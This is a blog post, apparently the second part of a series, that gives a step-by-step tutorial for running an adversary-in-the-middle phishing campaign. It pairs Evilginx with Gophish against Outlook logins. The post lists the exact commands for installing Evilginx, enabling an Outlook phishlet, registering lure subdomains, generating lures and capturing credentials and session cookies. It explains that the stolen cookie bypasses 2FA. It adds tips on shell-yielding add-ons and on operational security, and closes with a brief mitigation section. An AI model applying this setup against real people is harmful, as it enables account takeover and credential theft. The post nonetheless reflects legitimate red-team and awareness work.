<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Passing the Phish II" /><meta name="author" content="Babligan" /><meta property="og:locale" content="en_US" /><meta name="description" content="At this point, we’ve should have covered the following according to the previous post. Installation of Gophish Setup SendGrid as our SMTP server Installation of Evilginx and setting up a lure Integrating Gophish and evilginx" /><meta property="og:description" content="At this point, we’ve should have covered the following according to the previous post. Installation of Gophish Setup SendGrid as our SMTP server Installation of Evilginx and setting up a lure Integrating Gophish and evilginx" /><link rel="canonical" href="https://sneezy-ladybug.github.io/posts/passing-the-phish-II/" /><meta property="og:url" content="https://sneezy-ladybug.github.io/posts/passing-the-phish-II/" /><meta property="og:site_name" content="Sneezy Ladybug" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-06-27T16:34:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Passing the Phish II" /><meta name="twitter:site" content="@sneezy_ladybug" /><meta name="twitter:creator" content="@Babligan" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Babligan"},"headline":"Passing the Phish II","dateModified":"2021-06-28T13:29:41+00:00","datePublished":"2021-06-27T16:34:00+00:00","description":"At this point, we’ve should have covered the following according to the previous post. Installation of Gophish Setup SendGrid as our SMTP server Installation of Evilginx and setting up a lure Integrating Gophish and evilginx","url":"https://sneezy-ladybug.github.io/posts/passing-the-phish-II/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://sneezy-ladybug.github.io/posts/passing-the-phish-II/"},"@context":"https://schema.org"}</script><title>Passing the Phish II | Sneezy Ladybug</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-D8RZPKVWG8"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-D8RZPKVWG8'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/babligan.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Sneezy Ladybug</a></div><div class="site-subtitle font-italic">Writer. Infosec enthusiast. Interested in Offensive Infrastructure.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/sneezy-ladybug" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/sneezy_ladybug" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Passing the Phish II</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Passing the Phish II</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Babligan </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Jun 27, 2021, 4:34 PM +0000" prep="on" > Jun 27 <i class="unloaded">2021-06-27T16:34:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Jun 28, 2021, 1:29 PM +0000" prefix="Updated " > Jun 28 <i class="unloaded">2021-06-28T13:29:41+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1253 words">6 min</span></div></div><div class="post-content"><p>At this point, we’ve should have covered the following according to the previous <a href="https://babligan.github.io/posts/passing-the-phish/">post</a>.</p><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Installation of Gophish<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Setup SendGrid as our SMTP server<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Installation of Evilginx and setting up a lure<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Integrating Gophish and evilginx</ul><p>In this post we’ll cover the remaining bits.</p><h3 id="3-installing-and-running-evilginx">3. Installing and Running evilginx</h3><p>We’ll install evilginx on our second server. The official usage and installation of evilginx are available on the tool’s official <a href="https://github.com/kgretzky/evilginx2">Github project page</a>. Before installing evilginx, we have to install Go of at least version 1.14.0.</p><p>To do so, follow these steps:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>wget https://golang.org/dl/go1.16.5.linux-amd64.tar.gz
<span class="nb">sudo rm</span> <span class="nt">-rf</span> /usr/local/go <span class="o">&amp;&amp;</span> <span class="nb">sudo tar</span> <span class="nt">-C</span> /usr/local <span class="nt">-xzf</span> go1.16.5.linux-amd64.tar.gz
<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/local/go/bin
<span class="nb">source</span> <span class="nv">$HOME</span>/.profile
</pre></table></code></div></div><p>Finally verify that you have GO installed.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>go version
</pre></table></code></div></div><p>When you have GO installed, type in the following:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>apt-get <span class="nt">-y</span> <span class="nb">install </span>git make
git clone https://github.com/kgretzky/evilginx2.git
<span class="nb">cd </span>evilginx2
make
</pre></table></code></div></div><p>If you get this error, export the PATH variable again and reload bash. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/error.png" alt="[error.png]" /></p><p>Now that we have evilginx installed, let’s run it. To do so run:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sudo</span> ./bin/evilginx <span class="nt">-p</span> ./phishlets/
</pre></table></code></div></div><p><strong>IMPORTANT:</strong> Ensure that there’s no service running on ports TCP 443, TCP 80 and UDP 53. You may need to shutdown apache or nginx and any service used for resolving DNS that may be running. evilginx2 will tell you on launch if it fails to open a listening socket on any of these ports. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/first-run.png" alt="[first-run.png]" /></p><p>If you get this error, you’ll want to check what service is using port 53 (it should be your default DNS resolver, so we just need to stop it and let evilginx run it’s own in-built DNS server.)</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>lsof <span class="nt">-i</span> :53
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/lsof.png" alt="[lsof.png]" /></p><p>Then we’ll stop it either by stopping the service or killing it using its PID then edit the resolv.conf file to use Google’s DNS servers. If the echo command doesn’t work, use nano or vim instead.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>systemctl stop systemd-resolved
<span class="nb">rm</span> /etc/resolv.conf
<span class="nb">echo</span> <span class="s1">'nameserver 8.8.8.8'</span> <span class="o">&gt;</span> /etc/resolv.conf
</pre></table></code></div></div><p>When we restart evilginx, it should be fine. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/second-run.png" alt="[second-run.png]" /></p><p>The next step is the configuration of Evilginx. You have to specify the domain name and the IP address of your server:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>config domain domain-name.com
config ip 1.2.3.4
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/config.png" alt="[config.png]" /></p><p>Evilginx creates phishing links using phishlets. A phishlet is a YAML file that contains configuration to phish a specific website. You can access all the pre-defined phishlets at <code class="language-plaintext highlighter-rouge">/evilginx/phishlets</code> or you could view the available phishlets by typing <code class="language-plaintext highlighter-rouge">phishlets</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/phishlets.png" alt="[phishlets.png]" /></p><p>To activate a phishlet, run the following command: <code class="language-plaintext highlighter-rouge">phishlets hostname &lt;phishlet&gt; &lt;hostname&gt;</code> where the hostname is our domain. In our case, we want to use the outlook phishet. Therefore:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>phishlets <span class="nb">hostname </span>outlook domain-name.com
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/activate.png" alt="[activate.png]" /></p><p>For Evilginx to work correctly as a proxy, you will also have to configure the same sub-domains. To know which sub-domains are required, type:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>phishlets get-hosts outlook
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/gethosts.png" alt="[gethosts.png]" /></p><p>We have 3 subdomains to register: outlook, login and account. We’ll register these using CNAME records on our domain registrar. On our hosting site (I’m using namechep, but the configuration is usually the same across registrars), we’ll register 4 DNS records. The first will be an A record which points to the IP address of our VPS and the rest will be CNAME records for our sub-domains. One thing to note here, we don’t need to copy the <code class="language-plaintext highlighter-rouge">domain-name.com</code> part, we just need the preceding string.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/dns.png" alt="[dns.png]" /></p><p>Once your records have resolved (it usually takes less than 3 minutes or you could confirm with <a href="https://dnschecker.com">DNSChecker</a>), we can continue with enabling our phish. To do so we run:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>phishlets <span class="nb">enable </span>outlook
</pre></table></code></div></div><p>When enabling a phishlet, Evilginx will try to request SSL certificates from LetsEncrypt for the different sub-domains.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/enable2.png" alt="[enable.png]" /></p><p>Now that our phish is enabled, we’ll generate a lure which is basically the link that a target clicks on. The lures have to be attached with our desired phishlet and a redirect has to be set to point towards the legitimate website that we are trying to harvest credentials for, otherwise they’ll be rickrolled.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>lures create outlook
lures edit 0 redirect_url https://outlook.live.com/owa/?nlp<span class="o">=</span>1
lures get-url 0
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/lures2.png" alt="[lures.png]" /></p><p>If you wanted to change the hostname of your lure you’d use one of the subdomains that we registered and set it as follows:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>lures edit 0 <span class="nb">hostname </span>login.domain-name.com
</pre></table></code></div></div><p>Then you can go head and get the URL associated with the new hostname.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>lures get-url 0
</pre></table></code></div></div><p>Once a target clicks on our URL, they will be sent to our phishlet. And when they enter the correct credentials, we can capture them and redirect them to the right location.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/creds2.png" alt="[creds.png]" /></p><p>Now that we’ve verified that everything works, let’s tie it all together. The captured token can be imported into a browser with the EditThisCookie extension for example. By adding the cookie, the authentication is completely bypassed (even the 2FA) and the attacker has a complete access to the victim’s account.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/sessions2.png" alt="[sessions2.png]" /></p><h3 id="4-create-and-deploy-our-phish">4. Create and Deploy our Phish</h3><p>Back to Gophish’s email template and now we can craft the email we want to send our target. I’ll use a simple template from <a href="https://github.com/criggs626/PhishingTemplates">crigg626 Github repo</a>. I’ll use the <a href="https://github.com/criggs626/PhishingTemplates/blob/master/emails/Upgrade%20Webmail.html">Webmail Upgrade</a> template but feel free to use whichever one. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/final-template.png" alt="[final-template.png]" /></p><p>Just to make sure that it would land, I edited the href tag in the HTML code to point to our evilginx link. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/href.png" alt="[href.png]" /></p><p>To integrate our evilginx link, we’ll edit our Landing page and import the link. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/final-landing.png" alt="[final-landing.png]" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/import.png" alt="[import.png]" /></p><p>After we’ve checked that all sections have been filled correctly, we can finally launch our campaign. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/final-campaign.png" alt="[final-campaign.png]" /></p><p>When we check our email, we find it. Yay! <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/email.png" alt="[email.png]" /></p><p>When we click the link it opens a new tab, which is the outlook login page we had setup with evilginx. (you might have to clear your browser cache or use a different browser entirely). We sign in with some dummy creds and we are able to retrieve them on our evilginx server.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/redirect.png" alt="[redirect.png]" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/gophish/sessions.png" alt="[sessions.png]" /></p><h3 id="improvements">Improvements</h3><ol><li>To make the phishing email even more effective, you can choose to integrate it with a technique that is able to yield a shell. XSS, Maldocs, CSRF, HTML smuggling and many others can work.<li>For OPSEC, it is best to use infrastructure that you have complete control over. So, instead of using SendGrid, you can use your own mail server.<li>Ensure that you use TLS on <strong>ALL</strong> your phishing infrastructure which includes Gophish’s listening server.</ol><h3 id="mitigation">Mitigation</h3><ol><li>For this type of attack, the primary defense would always be exercising a little bit of paranoia. <strong>Always check the legitimacy of the domain that’s visible on the address bar.</strong><li>However, this wouldn’t be enough for big companies as it just requires one user to submit their correct credetials and just like that attackers are able to steal large amounts of data. This is where U2F for unphishable 2nd factor authentication comes in. It uses a physical hardware that you plug into a USB port and you just press a button when the website asks you to. The U2F protocol is designed to take the website’s domain as one of the key components in negotiating the handshake. This means that if the domain in the browser’s address bar, does not match the domain used in the data transmission between the website and the U2F device, the communication will simply fail. This solution leaves no room for error and is totally unphishable using Evilginx method.</ol><p>I hope you’ve learnt one or two things from this article. Be sure to check out these resources. Special thanks to <a href="https://twitter.com/_thevivi">Gabriel</a> for reviewing this <del>long ass</del> post. If you have any questions, or if there’s something I might have missed out, feel free to DM me on <a href="https://twitter.com/babligan">Twitter</a>.</p><ul><li><a href="https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens/">https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens/</a><li><a href="https://breakdev.org/evilginx-advanced-phishing-with-two-factor-authentication-bypass/">https://breakdev.org/evilginx-advanced-phishing-with-two-factor-authentication-bypass/</a><li><a href="https://github.com/kgretzky/evilginx2">https://github.com/kgretzky/evilginx2</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/infrastructure/'>Infrastructure</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/gophish/" class="post-tag no-text-decoration" >gophish</a> <a href="/tags/evilginx/" class="post-tag no-text-decoration" >evilginx</a> <a href="/tags/phishing/" class="post-tag no-text-decoration" >phishing</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Passing the Phish II - Sneezy Ladybug&url=https://sneezy-ladybug.github.io/posts/passing-the-phish-II/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Passing the Phish II - Sneezy Ladybug&u=https://sneezy-ladybug.github.io/posts/passing-the-phish-II/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Passing the Phish II - Sneezy Ladybug&url=https://sneezy-ladybug.github.io/posts/passing-the-phish-II/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/passing-the-phish-II/">Passing the Phish II</a><li><a href="/posts/passing-the-phish/">Passing the Phish</a><li><a href="/posts/smtp-relaying-for-phishing/">SMTP Relaying for Phishing</a><li><a href="/posts/primer-on-iptables/">A Comprehensive Primer on IPTables</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/phishing/">phishing</a> <a class="post-tag" href="/tags/evilginx/">evilginx</a> <a class="post-tag" href="/tags/gophish/">gophish</a> <a class="post-tag" href="/tags/firewall/">firewall</a> <a class="post-tag" href="/tags/iptables/">iptables</a> <a class="post-tag" href="/tags/netfilter/">netfilter</a> <a class="post-tag" href="/tags/postfix/">postfix</a> <a class="post-tag" href="/tags/smtp/">smtp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/passing-the-phish/"><div class="card-body"> <span class="timeago small" > Jun 25 <i class="unloaded">2021-06-25T16:34:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Passing the Phish</h3><div class="text-muted small"><p> At the core of it, phishing involves tricking a user into doing something they shouldn’t do. Also, not all phishing techniques involve tricking a user into clicking a malicious link on an email, en...</p></div></div></a></div><div class="card"> <a href="/posts/smtp-relaying-for-phishing/"><div class="card-body"> <span class="timeago small" > Mar 31 <i class="unloaded">2021-03-31T03:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SMTP Relaying for Phishing</h3><div class="text-muted small"><p> For anyone who’s tried to build phishing infrastucture that’s consistently reliable, you know by now how challenging that can be. First of all, a proper and functioning mail server has many moving ...</p></div></div></a></div><div class="card"> <a href="/posts/primer-on-iptables/"><div class="card-body"> <span class="timeago small" > Feb 20 <i class="unloaded">2021-02-20T11:10:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>A Comprehensive Primer on IPTables</h3><div class="text-muted small"><p> IPTables is essentially the built in command-line tool for managing Netfilter hooks which basically manages firewall rules. IPTables interacts with the netfilter framework to filter through packets...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/passing-the-phish/" class="btn btn-outline-primary" prompt="Older"><p>Passing the Phish</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/sneezy_ladybug">Sneezy Ladybug</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."> Some rights reserved. </span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/phishing/">phishing</a> <a class="post-tag" href="/tags/evilginx/">evilginx</a> <a class="post-tag" href="/tags/gophish/">gophish</a> <a class="post-tag" href="/tags/firewall/">firewall</a> <a class="post-tag" href="/tags/iptables/">iptables</a> <a class="post-tag" href="/tags/netfilter/">netfilter</a> <a class="post-tag" href="/tags/postfix/">postfix</a> <a class="post-tag" href="/tags/smtp/">smtp</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://sneezy-ladybug.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { 